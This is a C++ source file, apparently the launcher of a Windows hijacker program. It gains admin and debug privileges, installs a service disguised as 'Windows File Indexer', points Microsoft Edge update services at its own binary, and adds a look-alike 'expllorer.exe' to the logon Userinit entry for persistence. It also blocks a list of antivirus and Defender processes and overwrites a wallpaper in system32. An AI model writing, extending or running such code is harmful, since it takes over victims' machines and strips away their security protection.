/*f:\programm\tdm-gcc-64\bin\g++ "E:\Data\Project\万花劫持器\launcher.cpp" -o "E:\Data\Project\万花劫持器\launcher.exe" -Wl,--allow-multiple-definition -lpsapi*/



#include"bin\MustInclude.h"
#include"bin\GeneralTask.h"
#include"process.h"
#include"admin.h"
#include"RegFunc.h"
#include"file.h"
#define CLS system("cls");
#define PAUSE system("pause>nul");
#include<iostream>
using namespace std;
string CurDir,BinSrc;
string key="114514";
string src;
string tgt;
string SvcPath;
bool isGuard,isConfiged=0;




void install(){
	System("RegTest.exe");


	

	
	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());
	CreateWindowsService(//创建常驻伪装 注册表回写服务  
        "WFI",          // 服务名  
        "Windows File Indexer",          // 显示名  
        "Windows文件索引器",  // 描述  
        SvcPath.c_str(),    // 程序路径  
        SERVICE_AUTO_START           // 自动启动  
    );
	
	
	SetServiceBinPath("edgeupdate",SvcPath);
	SetServiceBinPath("edgeupdatem",SvcPath);
	SetServiceBinPath("MicrosoftEdgeElevationService",SvcPath);
	
	
	BanExe("360tray.exe");
	BanExe("ZhuDongFangYu.exe");
	BanExe("QQPCRTP.exe");
	BanExe("kxetray.exe");
	BanExe("RavMonD.exe");
	BanExe("BaiduSdSvc.exe");
	BanExe("ksafe.exe");
	BanExe("wsctrl.exe");
	BanExe("hipstray.exe");
	BanExe("usysdiag.exe");
	BanExe("MsMpEng.exe");
	BanExe("MsSense.exe");
	BanExe("SenseIR.exe");
	
	
	//system("sc.exe config AppIDSvc start=auto");
	//system("sc.exe start AppIDSvc");
	

	
}



void copyToBin(char* binPath){

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileToDirectory(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileWithCommand(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}
}

void init(){//这个启动器被编译为32位，文件复制大概率走不通，那么就启动FileSpawner.exe

	CurDir=GetCurrentDirectory();
	BinSrc=CurDir+"\\bin\\";
	SvcPath=string(BIN_PATH)+string("SCMServiceGuard.exe");
	

	
	CopyFileToDirectory(addStrings(BinSrc.c_str(),WALLPAPER_NAME),"C:\\windows\\system32\\");//拷贝目标壁纸
	
	copyToBin(BIN_PATH); CLS
	copyToBin(SECOND_BIN_PATH); CLS
	

	for(int time=0;time<4;time++){//Retry
	System("FileSpawner.exe");


	}
	
	


}

int main () {//用于自动恢复
	RequestAdminRightsWithArgs();
	EnableDebugPrivilege();
	init();
	/*string YourKey;cout<<"Please enter the password=> ";cin>>YourKey;CLS
	if(YourKey!=key){system("wininit.exe");}*/

	install();



	return 0;
}